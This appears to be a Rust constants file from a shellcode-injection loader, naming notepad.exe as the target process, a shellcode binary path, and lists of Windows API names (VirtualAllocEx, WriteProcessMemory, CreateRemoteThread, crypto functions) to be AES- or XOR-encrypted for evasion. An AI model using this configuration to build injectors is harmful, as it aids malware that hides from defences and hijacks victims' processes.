const RESOURCE_ID: u32 = 100;
const RESOURCE_NAME: &'static str = "resource.bin";

const TARGET_PROCESS: &'static str = "notepad.exe";
const SHELLCODE_PATH: &'static str = "build_src/shellcode64.bin";

//range for random byte generation. will generate random amount of junk data between resource entries.
const RANGE_START: usize = 0;
const RANGE_END: usize = 0x100;

static AES_STRINGS: [&str; 16] = [
    "VirtualAlloc",
    "VirtualAllocEx",
    "VirtualProtect",
    "CreateRemoteThread",
    "WaitForSingleObject",
    "WriteProcessMemory",
    "OpenProcess",
    "RtlMoveMemory",
    "CreateToolhelp32Snapshot",
    "Process32First",
    "Process32Next",
    "CloseHandle",
    "GetLastError",
    "ReflectiveLoader",
    "MessageBoxA",
    "USER32.dll",
];

static XOR_STRINGS: [&str; 12] = [
    "LoadLibraryA",
    "CryptAcquireContextW",
    "CryptCreateHash",
    "CryptHashData",
    "CryptDeriveKey",
    "CryptDecrypt",
    "CryptReleaseContext",
    "CryptSetKeyParam",
    "CryptDestroyHash",
    "CryptDestroyKey",
    "ADVAPI32.dll",
    "KERNEL32.DLL",
];

// will try to automate the configs stuff, later. At the moment, doesn't work with 'cargo build', and encryption with OpenSSL doesn't work in 32 bit mode.
// I may have to switch out OpenSSL for windows-rs and just use the windows API for encryption.
// #[cfg(all(windows, target_pointer_width = "64"))]
// const TARGET_PROCESS: &'static str = "notepad.exe";
// #[cfg(all(windows, target_pointer_width = "32"))]
// const TARGET_PROCESS: &'static str = "cheatengine.exe";

// #[cfg(all(windows, target_pointer_width = "64"))]
// const SHELLCODE_PATH: &'static str = "build_src/shellcode64.bin";
// #[cfg(all(windows, target_pointer_width = "32"))]
// const SHELLCODE_PATH: &'static str = "build_src/shellcode32.bin";
